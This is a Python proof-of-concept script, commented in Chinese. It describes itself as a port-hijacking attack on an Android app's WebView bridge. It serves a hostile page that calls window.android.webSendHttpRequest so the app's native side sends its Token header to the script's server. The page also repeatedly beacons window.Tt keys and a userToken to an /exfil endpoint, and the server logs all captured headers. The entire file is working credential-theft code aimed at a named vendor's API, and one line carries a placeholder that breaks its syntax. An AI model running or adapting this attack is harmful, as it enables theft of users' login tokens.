"""端口抢占 PoC v2:劫持页面主动调用桥方法 webSendHttpRequest,
诱使 App 原生侧自动附带 Token 头请求回我们的服务器 → 抓取登录凭证"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse, datetime

PAGE = b"""<!DOCTYPE html><html><head><meta charset="utf-8"><title>POC</title></head><body>
<h1 style="color:red">PORT HIJACK POC v2</h1>
<script>
function steal(){
  try {
    var req = {requestId: 'pwn' + Date.now(),
               url: 'http://localhost:17979/steal?x=api.unitree.com',
               method: 'GET', data: {}, timeout: 8000};
    window.android.webSendHttpRequest(JSON.stringify(req));
    var img = new Image(); img.src = '/exfil?d=' + encodeURIComponent('{"bridge_call":"sent"}');
  } catch(e) {
    var img2 = new Image(); img2.src = '/exfil?d=' + encodeURIComponent('{"bridge_call":"err","msg":"'+e+'"}');
  }
}
var img0 = new Image(); img0.src = '/exfil?d=' + encodeURIComponent('{"stage":"onload","android":(typeof window.android)}');
setInterval(function(){ try { var img = new Image(); img.src = '/exfil?d=' + encodeURIComponent(JSON.stringify({stage:'tt', keys:Object.keys(window.Tt||{}), token:<访问令牌_01>}).userToken||null})); } catch(e){} }, 4000);
setTimeout(steal, 1500); setInterval(steal, 5000);
</script>
</body></html>"""

class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        print(f"[{datetime.datetime.now():%H:%M:%S}] GET {self.path[:200]}", flush=True)
        if path in ('/steal', '/exfil'):
            if path == '/steal':
                print("    >>> 收到 App 原生侧请求,头部如下:", flush=True)
            for k, v in self.headers.items():
                print(f"    {k}: {v}", flush=True)
            body = b'{"code":0,"data":{}}'
        else:
            body = PAGE
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

print("PoC v2 server on :8000 — waiting for hijacked page to trigger token theft...")
HTTPServer(('127.0.0.1', 8000), H).serve_forever()

